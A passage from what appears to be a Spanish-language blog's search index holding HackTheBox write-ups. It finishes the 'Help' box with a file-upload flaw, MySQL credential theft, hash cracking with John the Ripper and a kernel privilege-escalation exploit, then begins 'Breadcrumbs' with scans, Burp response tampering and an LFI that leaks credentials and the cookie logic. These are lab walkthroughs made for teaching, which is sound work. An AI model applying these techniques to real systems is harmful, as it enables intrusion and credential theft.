PATHINFO_EXTENSION);    $filename = md5($_FILES['attachment']['name']. time()).  .  . $ext;    $fileuploaded[] = array('name' =&gt; $_FILES['attachment']['name'], 'enc' =&gt; $filename, 'size' =&gt; formatBytes($_FILES['attachment']['size']), 'filetype' =&gt; $_FILES['attachment']['type']);    $uploadedfile = $uploaddir. $filename;    if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {      $show_step2 = true;      $error_msg = $LANG['ERROR_UPLOADING_A_FILE'];    }else{      $fileverification = verifyAttachment($_FILES['attachment']);      switch($fileverification['msg_code']){        case '1':        $show_step2 = true;        $error_msg = $LANG['INVALID_FILE_EXTENSION'];        break;        case '2':        $show_step2 = true;        $error_msg = $LANG['FILE_NOT_ALLOWED'];        break;        case '3':        $show_step2 = true;        $error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']);        break;      }    }  }}. . . Bien, esa parte es la que toma el attachment (archivo adjunto) y lo procesa. Podemos detallar algunas cosas:  Intente buscar alguna definici√≥n de la ruta UPLOAD_DIR, pero al estar al lado de /tickets, podemos intuir que toma:     UPLOAD_DIR como http://10. 10. 10. 121/support/uploads /tickets.     Vemos que extrae la extensi√≥n del objeto que subimos.  Toma el nombre del objeto, extrae la fecha actual en que esta siendo subido, junta los dos valores y los pasa a MD5 (toma sentido el exploit) y le agrega la extensi√≥n.  SUBE EL ARCHIVO con la funci√≥n move_uploaded_file, aunque tenga errores o lo que sea que pase, PEEEEEEERO EN NING√öN MOMENTO BORRA NADA, por eso el exploit se empe√±a en buscarlo, el backend no lo borra del sistema üò≥Perfectisimooooooooooo, vaya fallito eh!  Recurso para entender los tipos de $_FILES.  Ac√° el fuente de submit_ticket_controller. php. Pues sigamos, ya sabemos por qu√© podemos ver un archivo que supuestamente nos devolv√≠a error. ‚Ä¶ Conseguimos credenciales para obtener una Shell con SSH #: Enumerando los directorios desde donde salimos hacia atr√°s, encontramos un objeto llamado config. php en la carpeta /includes: help@help:/var/www/html/support/includes$ ls -latotal 152. . . -rwxrwxrwx 1 root root  274 Nov 27 2018 config. php. . . Si vemos su contenido encontramos unas credenciales contra la base de datos support: help@help:/var/www/html/support/includes$ cat config. php &lt;?php    $config['Database']['dbname'] = 'support';    $config['Database']['tableprefix'] = '';    $config['Database']['servername'] = 'localhost';    $config['Database']['username'] = 'root';    $config['Database']['password'] = 'helpme';    $config['Database']['type'] = 'mysqli';?&gt;Pues perfecto, tom√©moslas y probemos si son v√°lidas:  root : helpme‚Ä¶ Empezamos a dumpear la base de datos support üîó: help@help:/var/www/html/support/includes$ mysql -u root -p Si se√±ores, tamos dentro de MySQL con las credenciales de root, veamos si hay algo √∫til:  Probando las credenciales contra SSH no logramos nada, solo son validas en MySQL. Veamos que bases de datos hay: mysql&gt; show databases;+--------------------+| Database      |+--------------------+| information_schema || mysql       || performance_schema || support      || sys        |+--------------------+5 rows in set (0. 00 sec)Las 4 de siempre, enfoqu√©monos en support, us√©mosla y veamos sus tablas: mysql&gt; use support;mysql&gt; show tables;+------------------------+| Tables_in_support   |+------------------------+| articles        || attachments      || canned_response    || custom_fields     || departments      || emails         || error_log       || file_types       || knowledgebase_category || login_attempt     || login_log       || news          || pages         || priority        || settings        || staff         || tickets        || tickets_messages    || users         |+------------------------+19 rows in set (0. 00 sec)Uff, varios nombres llamativos:  login_log settings staff tickets tickets_messages usersPrimero veamos si hay algo llamativo en users: Bien, varios intentos m√≠os ü•¥, pero adem√°s hay un usuario nuevo, helpme‚Ä¶ Si tomamos cualquier contrase√±a (hash) y validamos su formato vemos que son tipo SHA1 (or SHA 128). Pues apoy√©monos de JtR (John The Ripper) para intentar crackear ese hash, guard√©moslo en un archivo y ejecutemos: ‚ù± john --wordlist=/usr/share/wordlists/rockyou. txt helpme. hash . . . Using default input encoding: UTF-8Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])Press 'q' or Ctrl-C to abort, almost any other key for statusgodhelpmeplz   (?)1g 0:00:00:00 DONE (2021-07-21 18:19) 1. 176g/s 9220Kp/s 9220Kc/s 9220KC/s godhibiki. . godhelpmeeUse the  --show --format=Raw-SHA1  options to display all of the cracked passwords reliablySession completedOPA, encontramos una coincidencia, la contrase√±a en texto plano es godhelpmeplz :o En teor√≠a estas credenciales son v√°lidas contra el servidor web, o sea, contra el login (si lo son üòé). Pero probando contra SSH ya sea con root o help no son funcionales :( ‚Ä¶ Seguimos dumpeando y encontramos nuevas credenciales üîó: Veamos si hay algo en las otras tablas‚Ä¶ Jugando llegamos a la data de la tabla staff: mysql&gt; SELECT * FROM staff;Encontramos varios campos y data juguetona, filtremos por los interesantes: Otras credenciales, ahora hacen referencia a un usuario llamado admin, tomemos la pw y hagamos el mismo procedimiento de antes a ver si conseguimos algo: ‚ù± john --wordlist=/usr/share/wordlists/rockyou. txt admin. hash . . . Using default input encoding: UTF-8Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])Press 'q' or Ctrl-C to abort, almost any other key for statusWelcome1     (?)1g 0:00:00:00 DONE (2021-07-21 18:34) 4. 545g/s 183636p/s 183636c/s 183636C/s abygail. . Thomas1Use the  --show --format=Raw-SHA1  options to display all of the cracked passwords reliablySession completedTambi√©n hay coincidencias, si probamos de nuevo contra SSH logramos una sesi√≥n como el usuario help: ‚ù± ssh help@10. 10. 10. 121 As√≠ que ya podemos olvidarnos de la reverse Shell y quedarnos con la nueva SSH (: ‚Ä¶ Escalada de privilegios #:  Enumerando el sistema cai en varios rabbit hole al no buscar primero cosas esenciales :( uno con exim4, otro con graphql, con js, bueno, algunas perdidas e. e Viendo las caracter√≠sticas del sistema nos encontramos la versi√≥n del kernel: help@help:/tmp$ uname -aLinux help 4. 4. 0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/LinuxSi buscamos en la web alguna vulnerabilidad relacionada la versi√≥n 4. 4. 0-116-generic caemos a este recurso:  Linux Kernel &lt; 4. 4. 0-116 (Ubuntu 16. 04. 4) - Local Privilege Escalation. Una explotaci√≥n al kernel que despues de jugar con huecos en la memoria, shellcodes y cositas nos deber√≠a devolver una /bin/bash siempre y cuando seamos root (despues de toodo el proceso que hace): . . .   if (getuid() == 0) {    printf( spawning root shell\n );    system( /bin/bash );    exit(0);. . . Pues intentemos usarlo, veamos si la m√°quina tiene gcc para compilarlo, o si no lo compilamos en nuestra m√°quina y despues lo subimos: help@help:/tmp$ which gcc/usr/bin/gccListos, existe, as√≠ que copiamos el c√≥digo del exploit y mov√°moslo a la m√°quina v√≠ctima: help@help:/tmp/keke$ file kerLokhe. c kerLokhe. c: C source, ASCII text, with CRLF line terminatorsAhora compil√©moslo para generar el ejecutable: help@help:/tmp/keke$ gcc kerLokhe. c -o kerLokhehelp@help:/tmp/keke$ file kerLokhekerLokhe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64. so. 2, for GNU/Linux 2. 6. 32, BuildID[sha1]=e3143a5446c02fb5b32c79eaf037488a003040af, not strippedListo, pues ejecut√©moslo: help@help:/tmp/keke$ . /kerLokheInstant√°neamente veeeeeeeeemooooooooooooooooooooos: Y conseguimos nuestra dichosa /bin/bash como el usuario root (: Veamos las flags: ‚Ä¶ Linda m√°quina, completica de vulnerabilidades conocidas (CVEs), lo cual est√° brutal, ya que apunta a ser lo m√°s real (y lo es). Muchas gracias por leer y como siempre, A S3GU1R R0MP1ENDO 7ODO!!! "
    }, {
    "id": 35,
    "url": "http://localhost:4000/htb/breadcrumbs",
    "title": "HackTheBox - Breadcrumbs",
    "body": "2021/07/17 - M√°quina Windows nivel dif√≠cil. Jugaremos mucho con inyecciones y robos :P Encontraremos un LFI, haremos cookie-hijacking, leeremos contrase√±as almacenadas, jugando con binarios encontramos una URL que nos llevara de la mano a un SQLi y haremos desencriptaci√≥n con claves AES.  TL;DR (Spanish writeup): Creada por: helich0pper. ¬øTodo perfe?  Se viene un laaargo writeup, pero es bastante practico y con cositas interesantes‚Ä¶ M√°quina muuuuuy divertida, empezaremos encontrando un servicio web que nos permite (entre varias cosas) listar libros de una base de datos y subir archivos, pero solo si tenemos permisos de administrador. En vez de encontrar una vulnerabilidad SQL en el listado de libros encontraremos un LFI que nos permitir√° ver archivos del sistema, usaremos esto para entender como tener permisos de administrador y subir el archivo. Validando nos daremos cuenta de que es necesario tener la sesi√≥n del usuario paul dentro del portal web; con esto en mente visitaremos el archivo que genera las cookies (cookie. php) para entenderlo y ver si podemos simular la sesi√≥n de paul. Y s√≠, vemos como se generan y despues de algo de jugueteo logramos obtener la cookie del usuario paul, la usaremos para obtener acceso como √©l en el sitio web. Despues de unos movimientos con tokens lograremos subir archivos al sitio, por medio de Burp podemos cambiar el contenido e incluso el nombre del archivo a subir, con esto lograremos subir un archivo . php para obtener ejecucion remota de comandos, generaremos una Reverse Shell para finalmente obtener una sesi√≥n como el usuario www-data (:  RCE mediante el archivo . php (me gusto resto el script). Enumerando encontraremos unas credenciales para un servicio de pizza a domicilio :P el cual tiene info de juliette, que validando, es un usuario del sistema y con esas credenciales logramos su sesi√≥n por medio de SSH. En las ‚Äúnotas‚Äù de juliette encontraremos 3 tareas a realizar, pero que 1 nos llamara la atenci√≥n, habla sobre el software Microsoft Sticky Notes y que es necesario migrar las contrase√±as, ya que las guarda en texto plano‚Äù, con esto en mente lograremos (con ayuda de Google) encontrar la ruta donde se guardan estos archivos y efectivamente, encontraremos las credenciales de juliette, pero a la vez las del usuario development, las usaremos para migrarnos a su sesi√≥n. Encontraremos un binario algo inquietante que juega con llaves AES, revisando su contenido (type &lt;file&gt;) veremos que es tipo ELF y que tiene hardcodeada una URL con la que hace el juego de las llaves‚Ä¶ La URL corre en el puerto 1234, si jugamos con cURL e intentamos ‚Äúexplotarla‚Äù vemos respuesta por parte de mysql, nos apoyaremos de un Remote Port Forwarding para llevarnos el puerto 1234 a nuestra m√°quina y probar cositas, nos enfrentaremos a una inyecci√≥n SQL blind que usaremos para extraer la password del usuario administrador.  SQLi, fases para obtener la info de la base de datos. Finalmente usaremos la columna aes-key (inicialmente nos la muestra como resultado de una ejecucion normal hacia la URL, pero tambi√©n podemos extraerla con el SQLi) para desencriptar la password. Usando la contrase√±a desencriptada lograremos una sesi√≥n en la m√°quina como el usuario administrator. Mucho textoooooooooooo, a darle. ‚Ä¶ Clasificaci√≥n de la m√°quina:  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ ¬øQue vamos a hacer?  Enumeraci√≥n.  Explotaci√≥n.  Movimiento Lateral Juliette.  Movimiento Lateral Development.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Inicialmente haremos un escaneo de puertos para saber que servicios est√°n activos en la m√°quina: ‚ù≠ nmap -p- --open -v 10. 10. 10. 228 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535.        ‚Äìopen   Solo los puertos que est√°n abiertos.        -v   Permite ver en consola lo que va encontrando.        -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard.    ‚ù≠ cat initScan # Nmap 7. 80 scan initiated Wed Mar 10 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 228# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 228 ()  Status: UpHost: 10. 10. 10. 228 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, open/tcp//mysql///, 5040/open/tcp//unknown///, 7680/open/tcp//pando-pub///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp////, 49669/open/tcp/////# Nmap done at Wed Mar 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 74. 39 secondsOko, tenemos varios puertos:       Puerto   Descripci√≥n         22   SSH: Acceso a un servidor remoto por medio de un canal seguro.        80   HTTP: Servidor web.        135   RPC: Permite ejecutar procesos remotamente.        139   SMB: Permite compartir informaci√≥n entre dispositivos de la misma red.        443   HTTPS: Servidor web ‚Äúseguro‚Äù.        445   SMB: Permite compartir informaci√≥n entre dispositivos de la misma red.        3306   MYSQL: Gestor de bases de datos.        7680   pando-pub: Aplicaci√≥n para enviar archivos muy pesados.        5040/49664/49665   No sabemos       49666/49667/49668/49669   No sabemos   Ahora hagamos un escaneo de scripts y versiones con base en cada servicio (puerto) encontrado, asi validamos a profundidad cada uno: ‚ù≠ nmap -p 22,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49667,49668,49669 -sC -sV 10. 10. 10. 228 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚ù≠ cat portScan# Nmap 7. 80 scan initiated Wed Mar 10 25:25:25 2021 as: nmap -p 22,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49667,49668,49669 -sC -sV -oN portScan 10. 10. 10. 228Nmap scan report for 10. 10. 10. 228Host is up (0. 12s latency). PORT   STATE SERVICE    VERSION22/tcp  open ssh      OpenSSH for_Windows_7. 7 (protocol 2. 0)| ssh-hostkey:|  2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)|  256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)|_ 256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)80/tcp  open http     Apache httpd 2. 4. 46 ((Win64) OpenSSL/1. 1. 1h PHP/8. 0. 1)| http-cookie-flags:|  /:|   PHPSESSID:|_   httponly flag not set|_http-server-header: Apache/2. 4. 46 (Win64) OpenSSL/1. 1. 1h PHP/8. 0. 1|_http-title: Library135/tcp  open msrpc     Microsoft Windows RPC139/tcp  open netbios-ssn  Microsoft Windows netbios-ssn443/tcp  open ssl/http   Apache httpd 2. 4. 46 ((Win64) OpenSSL/1. 1. 1h PHP/8. 0. 1)| http-cookie-flags:|  /:|   PHPSESSID:|_   httponly flag not set|_http-server-header: Apache/2. 4. 46 (Win64) OpenSSL/1. 1. 1h PHP/8. 0. 1 |_http-title: Library| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1. 1445/tcp  open microsoft-ds?3306/tcp open mysql?| fingerprint-strings: |  LANDesk-RC, NULL, SIPOptions, WMSRequest: |_  Host '10. 10. 14. 194' is not allowed to connect to this MariaDB server5040/tcp open unknown7680/tcp open pando-pub?49664/tcp open msrpc     Microsoft Windows RPC49665/tcp open msrpc     Microsoft Windows RPC49666/tcp open msrpc     Microsoft Windows RPC49667/tcp open msrpc     Microsoft Windows RPC49668/tcp open msrpc     Microsoft Windows RPC49669/tcp open msrpc     Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port3306-TCP:V=7. 80%I=7%D=3/10%Time=60494628%P=x86_64-pc-linux-gnu%r(NUSF:LL,4B, G. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . # Mucha info vacia. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . x20server );Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 3m08s| smb2-security-mode: |  2. 02: |_  Message signing enabled but not required| smb2-time: |  date: 2021-03-10T22:26:14|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Mar 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 181. 68 secondsObtenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH for_Windows_7. 7 (protocol 2. 0)       80   HTTP   Apache httpd 2. 4. 46       135   RPC   Microsoft Windows RPC       139   SMB   Microsoft Windows netbios-ssn       443   HTTPS   Apache httpd 2. 4. 46       445   SMB   Ni idea u. u       3306   MYSQL   MariaDB       7680   PANDO   No sabe . _ .        ‚Ä¶   Unknown   Unknown   Pues d√©mosle a los servicios y veamos por donde podemos empezar a romper :O ‚Ä¶ Puerto 80 ‚åñ: Bien, simplemente obtenemos lo que parece ser un simulador de librer√≠a, si nos fijamos hay un bot√≥n que nos redirecciona a /php/books. php, veamos: Jmmm, un buscador de libros intuyo, podemos buscar por t√≠tulo y por autor, si buscamos por cualquier letra nos filtra varios libros (claramente dependiendo de la letra :P), como por ejemplo buscando en el t√≠tulo la letra a, tenemos: Enumerando el c√≥digo fuente, vemos la ruta ‚Äúhttp://10. 10. 10. 228/js/books. js‚Äù que es la que procesa lo que hagamos en la web de los libros, asi mismo vemos en algunas partes del JavaScript el llamado de otro script:  . . /includes/bookController. php. Asi que tenemos otra ruta para enumerar, /includes. Esto me dio la idea de hacer un escaneo r√°pido con nmap para ver que recursos no est√°n a la vista sobre el servidor web del puerto 80: ‚ù≠ nmap -p 80 --script=http-enum 10. 10. 10. 228 -oN webScan‚ù≠ cat webScan # Nmap 7. 80 scan initiated Wed Mar 10 25:25:25 2021 as: nmap -p 80 --script=http-enum -oN webScan 10. 10. 10. 228Nmap scan report for 10. 10. 10. 228Host is up (0. 12s latency). PORT  STATE SERVICE80/tcp open http| http-enum: |  /db/: BlogWorx Database|  /css/: Potentially interesting directory w/ listing on 'apache/2. 4. 46 (win64) openssl/1. 1. 1h php/8. 0. 1'|  /db/: Potentially interesting directory w/ listing on 'apache/2. 4. 46 (win64) openssl/1. 1. 1h php/8. 0. 1'|  /icons/: Potentially interesting folder w/ directory listing|  /includes/: Potentially interesting directory w/ listing on 'apache/2. 4. 46 (win64) openssl/1. 1. 1h php/8. 0. 1'|  /js/: Potentially interesting directory w/ listing on 'apache/2. 4. 46 (win64) openssl/1. 1. 1h php/8. 0. 1'|_ /php/: Potentially interesting directory w/ listing on 'apache/2. 4. 46 (win64) openssl/1. 1. 1h php/8. 0. 1'# Nmap done at Wed Mar 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 27. 39 secondsBien, algo que me llamo la atenci√≥n fue la descripci√≥n de la carpeta /db/:  BlogWorx Database. Que si buscamos en internet, nos muestra exploits viejos relacionados con SQLi sobre ese servicio, pero probando con el archivo que esta dentro de esa carpeta (/db/db. php) no conseguimos nada‚Ä¶ Para tenerlo en cuenta. Si validamos el contenido del servicio HTTPS (443) vemos el mismo contenido que el del puerto 80‚Ä¶ Haciendo un escaneo con dirsearch encontramos nuevos directorios: ‚ù≠ dirsearch. py -u http://10. 10. 10. 228/ -q. . . 302 -  0B - http://10. 10. 10. 228/portal/ -&gt; login. php. . . Validando, efectivamente tenemos un login y tambi√©n la opci√≥n de registrarnos: En esta pantalla ya tenemos un redireccionamiento (en helper) a un archivo llamado /admins. php el cual tiene varios usuarios potenciales para tener en cuenta: Despues de registrarnos y entrar al ‚Äúportal‚Äù tenemos:  (Menu desplegable arriba a la derecha)  Contamos con 4 botones, veamos Check tasks: Interesante‚Ä¶ Relaciona todos los problemas que necesitan arreglar tanto en la web como en la compa√±ia‚Ä¶ Lo que nos damos cuenta con el ultimo problema es que si validamos la opcion logout del menu desplegable claramente hay un problema con su ejecuci√≥n: Bien, por ahora sigamos enumerando los recursos‚Ä¶ Si vemos el bot√≥n Order pizza obtenemos el mensaje:  Disabled for economical reasons :P Validando el bot√≥n User management: Vemos tambi√©n varios usuarios, la mayor√≠a ya los hab√≠amos visto en el anterior recurso, pero en este encuentro tenemos sus roles y adem√°s 3 nuevos usuarios:  sirine -&gt; Reception.  juliette -&gt; Server Admin.  support -&gt; -. De los 3 juliette es interesante, teng√°mosla presente por si algo, sigamos. Si validamos el √∫ltimo bot√≥n (File management) nos llevar√≠a al recurso /files. php, pero al dar clic tenemos un redireccionamiento a /index. php‚Ä¶ Si jugamos con BurpSuite podemos interceptar la petici√≥n antes de que nos redireccione para ver que contenido tiene realmente, esto jugando con el c√≥digo de estado, pas√°ndolo de 302 (Found) a 200 (Ok), hag√°moslo r√°pidamente: Primero habilitamos en las opciones del proxy el √≠tem para interceptar las respuestas: Ahora, lanzamos la petici√≥n desde la web y la interceptamos en Burp: Damos clic en Forward y obtenemos: Ahora simplemente modificamos el status code de 302 a 200 y damos clic en Forward:  Bien, tenemos un apartado para subir archivos . zip, pero si intentamos subir algo obtenemos:  Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it. Asi ees como viaja la petici√≥n: Y este es el archivo (/portal/assets/js/files. js) que procesa la petici√≥n: $(document). ready(function(){  $( #upload ). click(function(){    var formData = new FormData();    formData. append('file', $('#file')[0]. files[0]);    formData. append('task', $('#task'). val() +  . zip );    post(formData);    formData = null;  })});function post(formData){  jQuery. ajax({    url:  . . /includes/fileController. php ,    type:  POST ,    processData: false,    contentType: false,    data: formData,    success: function(res){      $( #message ). html(res);    }  });}No s√© por qu√© dice ‚Äúupload code‚Äù siempre, pero bueno esa es la respuesta. Tambi√©n entiendo que no podemos subir nada por el status que tenemos desde el inicio que dice Role: Awaiting approval, asi que por ahora no podremos hacer nada con esto‚Ä¶ Si queremos mantener la opci√≥n hecha en Burp sobre el status code, podemos crear una regla para que cada vez que llegue un status code de 302 nos lo cambie por 200:  Proxy &gt; Options &gt; Match and Replace &gt; Add: Y ya no tendr√≠amos que estar modificando la petici√≥n en Burp. ‚Ä¶ Jugando con Burp ca√≠ en cuenta de algo, al iniciar sesi√≥n se nos genera una Cookie con el siguiente formato: Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9. eyJKYXRhIjp7InVzZXJuYW1lIjoibGFueiJ9fQ. liQqzYVpD3qq_0y70ft7fHPwBFknX1Hd2Naxp7Ioubo;PHPSESSID=lanz23ccbc5fab78e561862271461cc6bedcO sea: Cookie: token=BLABLABLA; PHPSESSID=usernameBLABLABLAPodemos probar varias cosas, como incrementar el tama√±o de nuestro username, cambiar el contenido del PHPSESSID, agregar n√∫meros o incluso caracteres especiales y ver si nos responde algo inusual‚Ä¶ Pues despues de probar algunas de ellas, si agregamos el s√≠mbolo # en la variable PHPSESSID nos responde: Opa, vemos la ruta donde esta el servidor y adem√°s un usuario (www-data).  Tambi√©n para tenerlo en cuenta‚Ä¶ En este punto me estanqu√©, asi que volv√≠ atr√°s para ver que ten√≠a y que no hab√≠a revisado bien (y pues bien hecho). Volviendo al apartado donde buscamos libros por su t√≠tulo y autor, si nos enfocamos en el c√≥digo que hace todo el proceso, nos damos cuenta de algo interesante:  Les pongo el codigo pa ver si ven el error antes de explicarlo :P http://10. 10. 10. 228/js/books. js$(document). ready(function(){  var book = null;  $( #note ). click(function(){    $( #tableBody ). html(  );    const title = $( #title ). val();    const author = $( #author ). val();    if(title ==    &amp;&amp; author ==   ){      $( #message ). html( Nothing found :( );    }    else{      searchBooks(title, author);    }  })  $( #interested ). click(function(){  });});function getInfo(e){  const bookId =  book  + $(e). closest('tr'). attr('id') +  . html ;  jQuery. ajax({    url:  . . /includes/bookController. php ,    type:  POST ,    data: {      book: bookId,      method: 1,    },    dataType:  json ,    success: function(res){      $( #about ). html(res);    }  });}function modal(){  return '&lt;button type= button  onclick= getInfo(this)  class= btn btn-outline-warning  data-toggle= modal  data-target= #actionModal &gt;Book&lt;/button&gt;';}function searchBooks(title, author){  jQuery. ajax({    url:  . . /includes/bookController. php ,    type:  POST ,    data: {      title: title,      author: author,      method: 0,    },    dataType:  json ,    success: function(res){      if(res. length == 0 || res == false){        $( #message ). html( Nothing found :( );      }      else{        let ret =   ;        for(book in res){          $( #message ). html(  );          ret +=  &lt;tr id='  + res[book]. id +  '&gt; ;          ret +=  &lt;td&gt; +res[book]. title+ &lt;/td&gt; ;          ret +=  &lt;td&gt; +res[book]. author+ &lt;/td&gt; ;          ret +=  &lt;td&gt;  + modal() +  &lt;/td&gt; ;          ret +=  &lt;/tr&gt; ;          $( #tableBody ). html(ret)        }      }    }  });}Si validamos todo el recorrido que hace (compar√°ndolo con el HTML del cual extrae los IDs) tendr√≠amos resumidamente algo asi:  Cuando se genere un clic en el bot√≥n Search (ID note) guarda la info de los dos campos y si alguno de los dos tiene contenido se va para la funci√≥n searchBooks().  Aqu√≠ simplemente hace la b√∫squeda por medio de AJAX y si encuentra resultados los muestra, por ahora nada relevante.  Cuando nos muestra todos los libros encontrados, en pantalla tenemos m√°s opciones:  Si volvemos al codigo y buscamos el llamado al bot√≥n Book, vemos que se genera cada uno de ellos en la respuesta anterior, esta siendo llamada por la funci√≥n modal() y su contenido:. . . function modal(){  return '&lt;button type= button  onclick= getInfo(this)  class= btn btn-outline-warning  data-toggle= modal  data-target= #actionModal &gt;Book&lt;/button&gt;';. . .  Cuando se da clic nos lleva a la funci√≥n getInfo() y ac√° es donde esta el jugueteo:. . . function getInfo(e){  const bookId =  book  + $(e). closest('tr'). attr('id') +  . html ;  jQuery. ajax({    url:  . . /includes/bookController. php ,    type:  POST ,    data: {      book: bookId,      method: 1,    },. . . ‚Ä¶ Explotaci√≥n #: Que tenemos‚Ä¶  Vemos que genera una cadena de texto extrayendo el ID que despues buscara como bookId en el archivo bookController. php.  Simulando la cadena tendr√≠amos algo asi:     book2. html (2 o cualquier numero).    Esto ya llama la atenci√≥n porque podemos pensar que esta llamando archivos . html del sistema, o sea que podemos probar alg√∫n tipo de LFI (Local File Inclusion) o RFI (Remote File Inclusi√≥n). Interceptemos con Burp y juguemos‚Ä¶  Local File Inclusion: Ver archivos del sistema a lso cuales normalemten no tendriamos acceso. Remote File Inclusion: Ver archivos remotos (externos) desde el sistema local. (Lo cual es muuuuuuuuucho m√°s peligroso)  Inclusi√≥n de archivos.  Como funciona un Local File Inclusion. La petici√≥n normal ser√≠a esta: Ahora modificando el contenido podr√≠amos probar a encontrar inicialmente el archivo bookController. php para ver que tan lejos estamos del directorio /htdocs y centrarnos‚Ä¶  El propio output al poner una ruta equivocada nos indica donde estamos, pero no me acordaba. Probando . . /includes. . . tenemos el output del archivo: Un poco horrible el output :P, pero bueno, al menos confirmamos una inclusi√≥n local de archivos (LFI). Viendo su contenido me acord√© del archivo db. php, si vemos su contenido y lo intentamos hacer m√°s bonito tenemos: book=. . /db/db. php&amp;method=1&lt;?php$host =  localhost ;$port=3306;$user= bread ;$password= jUli901 ;$dbname= bread ;$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());?&gt;Nice, tenemos las credenciales de la base de datos de lo que parece ser el usuario juliette (si dice ‚Äúbread‚Äù pero la password dice otra cosa :P)‚Ä¶ Intentando rehusar esas contrase√±as contra el servicio SSH y mysql no logramos nada. Sigamos jugando con el LFI‚Ä¶ (Les dejo el contenido del archivo vulnerable para que le echen un ojo al problema: &lt;?phpif($_SERVER['REQUEST_METHOD'] ==  POST ){  $out =   ;  require '. . /db/db. php';  $title =   ;  $author =   ;  if($_POST['method'] == 0){    if($_POST['title'] !=   ){      $title =  % . $_POST['title'].  % ;    }    if($_POST['author'] !=   ){      $author =  % . $_POST['author'].  % ;    }    $query =  SELECT * FROM books WHERE title LIKE ? OR author LIKE ? ;    $stmt = $con-&gt;prepare($query);    $stmt-&gt;bind_param('ss', $title, $author);    $stmt-&gt;execute();    $res = $stmt-&gt;get_result();    $out = mysqli_fetch_all($res,MYSQLI_ASSOC);  }  elseif($_POST['method'] == 1){    $out = file_get_contents('. . /books/'. $_POST['book']);  }  else{    $out = false;  }  echo json_encode($out);}e. e) Si recordamos teniamos un archivo para subir objetos . zip, veamos su estructura: book=. . /portal/php/files. php&amp;method=1&lt;?php session_start();$LOGGED_IN = false;if($_SESSION['username'] !==  paul ){  header( Location: . . /index. php );}if(isset($_SESSION['loggedIn'])){  $LOGGED_IN = true;  require '. . /db/db. php';}else{  header( Location: . . /auth/login. php );  die();}?&gt;&lt;html lang= en &gt;&lt;head&gt;  &lt;title&gt;Binary&lt;/title&gt;  . . . . . . La raz√≥n por la que no podemos entrar es porque no es paul el que hace la petici√≥n :O Despues de dar algunas vueltas entre archivos buscando cositas, encontr√© una cadena interesante que quiz√°s nos pueda servir despues (secret_key): book=. . /portal/authController. php&amp;method=1. . . $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';. . . Y encontramos como se genera la cookie de sesi√≥n: book=. . /portal/cookie. php&amp;method=1&lt;?php/*** @param string $username Username requesting session cookie* * @return string $session_cookie Returns the generated cookie* * @devteam* * Please DO NOT use default PHPSESSID; our security team says they are predictable. * * CHANGE SECOND PART OF MD5 KEY EVERY WEEK**/function makesession($username){  $max = strlen($username) - 1;  $seed = rand(0, $max);  $key =  s4lTy_stR1nG_ . $username[$seed].  (!528. /9890 ;  $session_cookie = $username. md5($key);  return $session_cookie;  }Jugando con un ejecutador de c√≥digo online de PHP podemos entender mejor que hace: &lt;?php  $username =  lanz ;  echo  Username: $username\n ;    //Toma el tama√±o del username y le quita 1 (lanz (4)-1=3)  $max = strlen($username) - 1;   echo  Max: $max\n ;    //Toma un numero (en este caso) entre 0 y 3 (0,1,2,3)  $seed = rand(0, $max);    echo  Seed: $seed\n ;    //Con el numero anterior extrae un caracter del username y lo junta con dos cadenas  $key =  